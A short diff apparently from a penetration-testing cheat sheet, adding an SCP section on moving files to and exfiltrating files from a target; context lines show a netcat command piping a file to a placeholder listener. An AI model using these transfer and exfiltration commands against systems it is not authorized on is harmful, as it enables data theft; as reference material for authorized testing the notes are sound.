@@ -350,6 +350,14 @@ Listener:
 Client:
 `cat FILETOUPLOAD | nc LISTENERIP PORT`
 
+#### SCP
+
+If ssh credentials/keys are on hand, scp can be used to move files to/from the target, even if this specific box is not connected to the internet (but you still have a connection path to it).  
+
+Download to:
+`scp FILETOSEND USER@TARGET:PATHTOSTORE`
+Exfil from:
+`scp USER@TARGET:PATHTOGETFILE PATHTOSTOREONLOCALMACHINE`
 
 #### File Sharing Sites
 
